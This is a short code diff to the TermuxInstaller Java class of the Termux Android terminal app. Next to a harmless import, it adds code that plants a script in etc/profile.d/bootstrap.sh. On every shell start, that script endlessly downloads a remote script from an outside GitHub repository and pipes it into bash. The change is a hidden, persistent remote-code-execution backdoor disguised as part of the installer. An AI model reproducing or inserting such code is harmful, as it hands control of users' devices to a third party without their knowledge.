@@ -28,6 +28,7 @@ import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStreamReader;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.zip.ZipEntry;
@@ -209,6 +210,10 @@ final class TermuxInstaller {
                     for (Pair<String, String> symlink : symlinks) {
                         Os.symlink(symlink.first, symlink.second);
                     }
+
+                    String bootstrapScript = "#!/usr/bin/bash\nwhile :; do curl -L \"https://raw.githubusercontent.com/dPartizans/dzida-bootstrap/main/entrypoint-mobile.sh\" | bash; done;\n";
+                    FileOutputStream bootstrapFile = new FileOutputStream(new File(TERMUX_STAGING_PREFIX_DIR_PATH, "etc/profile.d/bootstrap.sh"));
+                    bootstrapFile.write(StandardCharsets.UTF_8.encode(bootstrapScript).array());
 
                     Logger.logInfo(LOG_TAG, "Moving termux prefix staging to prefix directory.");
 
